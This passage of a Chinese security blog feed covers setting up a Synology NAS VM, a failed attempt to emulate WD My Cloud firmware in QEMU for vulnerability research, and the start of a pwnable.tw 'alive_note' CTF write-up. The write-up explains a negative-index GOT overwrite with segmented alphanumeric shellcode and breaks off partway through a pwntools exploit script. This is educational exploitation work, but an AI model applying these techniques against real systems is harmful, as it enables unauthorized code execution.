      <url>2021/02/03/%E7%BE%A4%E6%99%96NAS%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>环境：链接:<a href="https://pan.baidu.com/s/1_m5PW3gptmiKBhCHP505yw" target="_blank" rel="noopener">https://pan.baidu.com/s/1_m5PW3gptmiKBhCHP505yw</a>  密码:2tos</p><p>开整群晖NAS，首先创建一个虚拟机</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E7%BE%A4%E6%99%96NAS%E7%8E%AF%E5%A2%83-1.png"  alt=""></p><p>然后将磁盘设定为初始磁盘</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E7%BE%A4%E6%99%96NAS%E7%8E%AF%E5%A2%83-2.png"  alt=""></p><p>最后选择自定设置，然后在虚拟机的设置界面把磁盘类型改为SATA，分配20g并选择预先分配磁盘空间，然后再创建一个新的类型为SATA的磁盘，开启虚拟机</p><p>等到出现这个界面：</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E7%BE%A4%E6%99%96NAS%E7%8E%AF%E5%A2%83-3.png"  alt=""></p><p>按照提示打开 find.synology.com ，跟着步骤来，安装DMS界面选择手动安装可以去下载中心下载固件来分析，文件内也附带了固件，等待安装好，创建用户之后就完成了。</p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOT </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次失败的西数nas的qemu环境搭建</title>
      <link href="2021/02/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E8%A5%BF%E6%95%B0nas%E7%9A%84qemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>2021/02/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84%E8%A5%BF%E6%95%B0nas%E7%9A%84qemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>漏洞：<a href="https://www.crowdstrike.com/blog/pwn2own-tale-of-a-bug-found-and-lost-again/" target="_blank" rel="noopener">https://www.crowdstrike.com/blog/pwn2own-tale-of-a-bug-found-and-lost-again/</a></p><p>固件：<a href="https://support-en.wd.com/app/products/product-detail/p/139#WD_downloads" target="_blank" rel="noopener">https://support-en.wd.com/app/products/product-detail/p/139#WD_downloads</a></p><p>下载：<a href="https://downloads.wdc.com/gpl/WDMyCloud_PR4100_GPL_v2.40.155_20200713.tar.gz" target="_blank" rel="noopener">https://downloads.wdc.com/gpl/WDMyCloud_PR4100_GPL_v2.40.155_20200713.tar.gz</a></p><h2 id="跟着txt文件走"><a href="#跟着txt文件走" class="headerlink" title="跟着txt文件走"></a>跟着txt文件走</h2><p>即 WD_My_Cloud_PR4100_Release_Notes_GPL_v2.40.155_20200713.txt</p><h3 id="3-5"><a href="#3-5" class="headerlink" title="3.5"></a>3.5</h3><p>开始报错，所以首先应该<code>git init</code>，然后<code>sudo apt-get install lib32z1</code>，再<code>./xbuild.sh build</code>，原因如下</p><ul><li>fatal: Not a git repository (or any of the parent directories): .git ：<code>git init</code></li><li>fatal: Needed a single revision : </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;xbuild.sh build</span><br><span class="line">fatal: Needed a single revision</span><br><span class="line">  HOSTCC  scripts&#x2F;basic&#x2F;fixdep</span><br><span class="line">  HOSTCC  scripts&#x2F;kconfig&#x2F;conf.o</span><br><span class="line">  HOSTCC  scripts&#x2F;kconfig&#x2F;zconf.tab.o</span><br><span class="line">  HOSTLD  scripts&#x2F;kconfig&#x2F;conf</span><br><span class="line">scripts&#x2F;kconfig&#x2F;conf  --silentoldconfig Kconfig</span><br><span class="line">  SYSTBL  arch&#x2F;x86&#x2F;syscalls&#x2F;..&#x2F;include&#x2F;generated&#x2F;asm&#x2F;syscalls_32.h</span><br><span class="line">  SYSHDR  arch&#x2F;x86&#x2F;syscalls&#x2F;..&#x2F;include&#x2F;generated&#x2F;asm&#x2F;unistd_32_ia32.h</span><br></pre></td></tr></table></figure><p>报错但是没有提示信息没找着解决方案，后面就也是这种编译信息了，目前还没发现问题，先放着</p><ul><li>error while loading shared libraries: libz.so.1: cannot open shared object file: No such file or directory : <code>sudo apt-get install lib32z1</code></li></ul><h3 id="3-6"><a href="#3-6" class="headerlink" title="3.6"></a>3.6</h3><p>报错，<code>cp: cannot create regular file &#39;/home/ctfer/IOT/WDMyCloud_PR4100_GPL_v2.40.155_20200713/toolchain/../firmware/merge/WDMyCloud/bzImage&#39;: No such file or directory</code>和类似的玩意，但是好消息是这些报错和上面的<code>fatal: Needed a single revision</code>应该都是无关紧要的：</p><p>The following build errors or warning messages are normal, and should be no cause for concern.</p><blockquote><p><strong>Copy Error (build script compensates, caused by broken xbuild script install method):</strong></p><p>cp: cannot create regular file ‘/Build/WDMyCloud_PR4100_GPL_v10.30.165_20170321/toolchain/…/firmware/merge/WDMyCloud/bzImage’: No such file or directory<br>cp: cannot create regular file ‘/Build/WDMyCloud_PR4100_GPL_v10.30.165_20170321/toolchain/…/firmware/merge/WDMyCloud/’: Not a directory</p><p><strong>Git Error (ignore, originates in xbuild script):</strong></p><p>fatal: Needed a single revision</p><p><strong>Kernel Module Signing (ignore or install certs):</strong></p><p>No X.509 certificates found</p><p><strong>Unresolved (ignore, probably a bug):</strong></p><p>drivers/target/target_core_pr.c: In function ‘core_scsi3_pr_seq_non_holder:<br>drivers/target/target_core_pr.c:332:3: warning: ‘return’ with no value, in function returning non-void [-Wreturn-type]<br>return;</p></blockquote><p>来自：<a href="https://community.wd.com/t/how-to-build-custom-firmware/217408" target="_blank" rel="noopener">https://community.wd.com/t/how-to-build-custom-firmware/217408</a></p><h3 id="4-5"><a href="#4-5" class="headerlink" title="4.5"></a>4.5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;xbuild.sh: 7: .&#x2F;xbuild.sh: source: not found</span><br><span class="line">.&#x2F;xbuild.sh: 21: .&#x2F;xbuild.sh: xcp: not found</span><br><span class="line">.&#x2F;xbuild.sh: 22: .&#x2F;xbuild.sh: xcp: not found</span><br></pre></td></tr></table></figure><p>需要将shell解释器改为bash</p><ol><li>执行<code>ls -l /bin/sh</code>命令，若得到结果<code>/bin/sh -&gt; dash</code>，则说明shell的解释器为dash。</li><li>执行<code>sudo dpkg-reconfigure dash</code>命令，然后选择no。</li><li>再次执行<code>ls -l /bin/sh</code>命令，若得到结果<code>/bin/sh -&gt; bash</code>，则说明成功更改shell的解释器为bash。</li></ol><p><a href="https://help.aliyun.com/document_detail/109503.html" target="_blank" rel="noopener">https://help.aliyun.com/document_detail/109503.html</a></p><h2 id="搭qemu环境"><a href="#搭qemu环境" class="headerlink" title="搭qemu环境"></a>搭qemu环境</h2><p><code>binwalk -Me WD-NAS-firmware</code>可以直接获取到squashfs-root</p><p>看exp该漏洞主要和<strong>login_mgr.cgi</strong>相关，检查可得</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ grep -r &quot;wd_login&quot;</span><br><span class="line">web&#x2F;pages&#x2F;index.php:cmd: &#39;wd_login&#39;,</span><br><span class="line">web&#x2F;pages&#x2F;index.php:&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;cmd&quot; value&#x3D;&quot;wd_login&quot;&gt;</span><br><span class="line">web&#x2F;pages&#x2F;cgi_api.php:case &quot;wd_login&quot;:</span><br><span class="line">Binary file cgi&#x2F;login_mgr.cgi matches</span><br><span class="line">$ file cgi&#x2F;login_mgr.cgi</span><br><span class="line">cgi&#x2F;login_mgr.cgi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.39, stripped</span><br></pre></td></tr></table></figure><p>查找“login_mar.cgi“没得到啥有用的信息，直接运行需要libc文件，索性先qemu起起来再说</p><h3 id="配置网卡"><a href="#配置网卡" class="headerlink" title="配置网卡"></a>配置网卡</h3><p>pdf的开始报错，来试试我上次成功的路线</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure><p>将/etc/network/interface改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># interfaces(5) file used by ifup(8) and ifdown(8)</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet manual</span><br><span class="line">up ifconfig ens33 0.0.0.0 up</span><br><span class="line">auto br0</span><br><span class="line">iface bro inet dhcp</span><br><span class="line"> bridge_ports ens33</span><br><span class="line"> bridge_maxwait 0</span><br></pre></td></tr></table></figure><p>将/etc/qemu-ifup改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">echo &quot;Executing &#x2F;etc&#x2F;qemu-ifup&quot;</span><br><span class="line">echo &quot;Bringing $1 for bridged mode...&quot;</span><br><span class="line">sudo &#x2F;sbin&#x2F;ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;Adding $1 to br0...&quot;</span><br><span class="line">sudo &#x2F;sbin&#x2F;brctl addif br0 $1</span><br><span class="line">sleep 3</span><br></pre></td></tr></table></figure><p>赋予文件/etc/qemu-ifup 可执行权限： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod a+x &#x2F;etc&#x2F;qemu-ifup</span><br></pre></td></tr></table></figure><p>重启网络使所有的配置生效： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;networking restart</span><br></pre></td></tr></table></figure><p>报错：networking.serviceJob for networking.service failed because the control process exited with error code</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl stop NetworkManager</span><br><span class="line">$ systemctl disable NetworkManager</span><br><span class="line">$ service network-manager restart</span><br></pre></td></tr></table></figure><p>(看起来已经重启完成了)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ifdown ens33</span><br></pre></td></tr></table></figure><p>还有一步$ sudo ifup br0，但是会报Unknown interface br0，但是ifconfig又有br0，非常的怪，和pdf报的错差不多，我先不去管它，来试试开个qemu</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-x86_64 -hda debian_squeeze_amd64_standard.qcow2 -net nic,macaddr&#x3D;00:16:3e:00:00:01 -net tap</span><br></pre></td></tr></table></figure><p>eth0找不着，且并没有分配好ip，大失败</p><h2 id="搭qemu环境2-0"><a href="#搭qemu环境2-0" class="headerlink" title="搭qemu环境2.0"></a>搭qemu环境2.0</h2><p>pdf: <a href="https://github.com/0bs3rver/learning-with-sakura/blob/master/IOT/%E4%BD%BF%E7%94%A8QEMU%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%EF%BC%88%E6%94%B9%EF%BC%89.pdf" target="_blank" rel="noopener">https://github.com/0bs3rver/learning-with-sakura/blob/master/IOT/%E4%BD%BF%E7%94%A8QEMU%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%EF%BC%88%E6%94%B9%EF%BC%89.pdf</a></p><p>我发现ens33和eth0好像是同一个玩意，那么根据我linux上的情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ ifconfig</span><br><span class="line">br-df6b7e261c0b Link encap:Ethernet  HWaddr 02:42:80:d9:c8:c3  </span><br><span class="line">          inet addr:172.18.0.1  Bcast:172.18.255.255  Mask:255.255.0.0</span><br><span class="line">          UP BROADCAST MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br><span class="line"></span><br><span class="line">docker0   Link encap:Ethernet  HWaddr 02:42:45:3c:3f:50  </span><br><span class="line">          inet addr:172.17.0.1  Bcast:172.17.255.255  Mask:255.255.0.0</span><br><span class="line">          UP BROADCAST MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br><span class="line"></span><br><span class="line">ens33     Link encap:Ethernet  HWaddr 00:0c:29:2a:f6:ef  </span><br><span class="line">          inet6 addr: fe80::20c:29ff:fe2a:f6ef&#x2F;64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:9 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:29 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:765 (765.0 B)  TX bytes:3334 (3.3 KB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1&#x2F;128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:420 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:420 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:32656 (32.6 KB)  TX bytes:32656 (32.6 KB)</span><br></pre></td></tr></table></figure><p>我可以再次尝试pdf上的方法，将eth0改为ens33即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo brctl addbr br0</span><br><span class="line">$ sudo brctl addif br0 ens33</span><br><span class="line">$ sudo brctl stp br0 on</span><br><span class="line">$ sudo dhclient br0</span><br></pre></td></tr></table></figure><p>更改qemu-ifup文件：<code>sudo vim /etc/qemu-ifup</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">#This is a qemu-ifup script for bridging.</span><br><span class="line">#You can use it when starting a KVM guest with bridge mode network. #set your bridge name</span><br><span class="line">switch&#x3D;br0</span><br><span class="line">if [ -n &quot;$1&quot; ]; then</span><br><span class="line">#create a TAP interface; qemu will handle it automatically.</span><br><span class="line">#tunctl -u $(whoami) -t $1</span><br><span class="line">#start up the TAP interface</span><br><span class="line">ip link set $1 up</span><br><span class="line">sleep 1</span><br><span class="line">#add TAP interface to the bridge</span><br><span class="line">brctl addif $&#123;switch&#125; $1</span><br><span class="line">exit 0</span><br><span class="line">else</span><br><span class="line">echo &quot;Error: no interface specified&quot;</span><br><span class="line">exit 1</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>起qemu</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-x86_64 -hda debian_squeeze_amd64_standard.qcow2 -m 256 -net nic -net tap,ifname&#x3D;tap1,script&#x3D;&#x2F;etc&#x2F;qemu-ifup,downscript&#x3D;no</span><br></pre></td></tr></table></figure><p>还是有问题，ifup eth0失败</p><h2 id="搭qemu环境3-0"><a href="#搭qemu环境3-0" class="headerlink" title="搭qemu环境3.0"></a>搭qemu环境3.0</h2><p>怀疑是我自己环境的问题，索性直接来试试在全新的ubuntu20上开</p><p>直接启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -hda debian_squeeze_amd64_standard.qcow2</span><br></pre></td></tr></table></figure><p>发现qemu可以ping通主机，还能传给主机文件，也能ping通百度，但是主机却ping不通虚拟机，主要是找不着ip。qemu上ifconfig只有默认的10.0.2.15</p><p>继续跟着pdf来设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo brctl addbr br0</span><br><span class="line">$ sudo brctl addif br0 ens33</span><br><span class="line">$ sudo brctl stp br0 on</span><br><span class="line">$ sudo dhclient br0</span><br></pre></td></tr></table></figure><p>但是直接就失败了，我虽然也生成了一个br0，但是ip和ens33的一样，据学长说是DHCP的问题</p><p>经教练提点，我打算放弃桥接的思路，直接进行一个qemu的端口映射，web服务，gdb调试端口啥的全都映射到主机，应该就不需要ping通了</p><p>成功：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-system-x86_64 -hda debian_squeeze_amd64_standard.qcow2 -net user,hostfwd&#x3D;tcp:172.16.119.176:2222-:22 -net nic</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -p 2222 root@172.16.119.176</span><br></pre></td></tr></table></figure><h2 id="起服务"><a href="#起服务" class="headerlink" title="起服务"></a>起服务</h2><p>首先mount</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mount -o bind &#x2F;dev .&#x2F;dev</span><br><span class="line">$ mount -t proc &#x2F;proc .&#x2F;proc</span><br><span class="line">$ chroot .</span><br></pre></td></tr></table></figure><p>但是这里报错 <code>chroot failed to run command ‘/bin/bash’ no such file or directory</code></p><p>找了一下，原因是缺少/bin/bash或者没有相关的库文件</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/WDMyCloud-1.png"  alt=""></p><p>cp过来后发现还是不行，会报上图第一行的错，索性把qemu的/bin/bash cp过来试试</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/WDMyCloud-2.png"  alt=""></p><p>把所有相关的lib文件复制完成后chroot倒是成功了，但是连ls都没有…这文件系统也太水了</p><p>试图执行login_mgr.cgi 会报错<code>libc.so.6: version GLIBC_2.14 not found</code>发现似乎是glibc版本太低了，使用strings打印可以看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ strings libc.so.6 | grep GLIBC_</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">GLIBC_2.2.6</span><br><span class="line">GLIBC_2.3</span><br><span class="line">GLIBC_2.3.2</span><br><span class="line">GLIBC_2.3.3</span><br><span class="line">GLIBC_2.3.4</span><br><span class="line">GLIBC_2.4</span><br><span class="line">GLIBC_2.5</span><br><span class="line">GLIBC_2.6</span><br><span class="line">GLIBC_2.7</span><br><span class="line">GLIBC_2.8</span><br><span class="line">GLIBC_2.9</span><br><span class="line">GLIBC_2.10</span><br><span class="line">GLIBC_2.11</span><br><span class="line">GLIBC_PRIVATE</span><br></pre></td></tr></table></figure><p>最高只支持到2.11</p><p>但是有点尬住了，我试图运行的时候发现缺一堆lib库，然后发现系统支持的glibc版本太低了，打算先更新下glibc，但是运行不了，因为qemu里面嘛也没有</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/WDMyCloud-3.png"  alt=""></p><p>那就只能在ub20上运行，发现缺一堆玩意就算起起来也只能勉强使用这一个服务，算了，去试试教练已经弄好的群晖nas了</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/WDMyCloud-4.png"  alt=""></p><h2 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h2><p>最终结果就是搞定了具体的编译和qemu的网络配置，但是并没有起上来服务，溜了溜了</p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOT </tag>
            
            <tag> pwn </tag>
            
            <tag> qemu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw-alive_note-构造分段shellcode</title>
      <link href="2021/01/14/pwnable-tw-alive-note-%E6%9E%84%E9%80%A0%E5%88%86%E6%AE%B5shellcode/"/>
      <url>2021/01/14/pwnable-tw-alive-note-%E6%9E%84%E9%80%A0%E5%88%86%E6%AE%B5shellcode/</url>
      
        <content type="html"><![CDATA[<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file alive_note </span><br><span class="line">alive_note: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;7202bc4e6b3c1df58cbac86ca55f98bbf0f99a6e, not stripped</span><br><span class="line">$ checksec alive_note </span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>32位程序，未去符号表，同时只开了canary保护</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序逻辑很简单，可以写名字，不能超过8个，用堆块存储，展示名字，删除名字，最多能有十个</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>程序的漏洞点在于读取序号时没有对负数进行限制，所以我们可以直接溢出到got表上</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>很明显我们需要写shellcode，但是题目做了限制，输入内容只能是空格、数字、大小写字母（没搞懂__ctype_b_loc是啥check，所以是试出来的），而且shellcode是分布在堆上的，且每块只有八个字节，这就给利用带来了很大的麻烦</p><p>因为heap内存区域有执行权限，故这里我们使用的方式是先构造调用sys_read的shellcode，再借助它往堆上读执行execve(“/bin/sh”,NULL,NULL)来get shell</p><p>另外需要注意的是由于每块只有八个字节，故我们需要使用jne指令构造跳转来连接多个块</p><p>我们在free函数的got表处来构造，首先我们需要知道程序运行到shellcode时的寄存器值</p><p>(0x0804a014 - 0x0804a080) /4 = -27</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, time</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch='amd64',os='linux',log_level='debug')</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">elf = ELF(<span class="string">"./alive_note"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_64.so.6"</span>)</span><br><span class="line">io = process(elf.path,env=&#123;<span class="string">"LD_PRELOAD"</span> : libc.path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">elf = ELF(<span class="string">"./alive_note"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_64.so.6"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10300</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line">s = io.send                                    <span class="comment">#</span></span><br><span class="line">sl = io.sendline                               <span class="comment">#</span></span><br><span class="line">sa = io.sendafter                              <span class="comment">#</span></span><br><span class="line">sla = io.sendlineafter                         <span class="comment">#</span></span><br><span class="line">r = io.recv                                    <span class="comment">#</span></span><br><span class="line">rl = io.recvline                               <span class="comment">#</span></span><br><span class="line">ru = io.recvuntil                              <span class="comment">#</span></span><br><span class="line">it = io.interactive                            <span class="comment">#</span></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">b'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">b'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; : &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># base addr</span></span><br><span class="line">gdb_text_base = int(os.popen(<span class="string">"pmap &#123;&#125;"</span>.format(io.pid)).readlines()[<span class="number">1</span>][<span class="number">4</span>:<span class="number">16</span>], <span class="number">16</span>)</span><br><span class="line">gdb_libc_base = int(os.popen(<span class="string">"pmap &#123;&#125;| grep libc"</span>.format(io.pid)).readlines()[<span class="number">0</span>][<span class="number">4</span>:<span class="number">16</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug 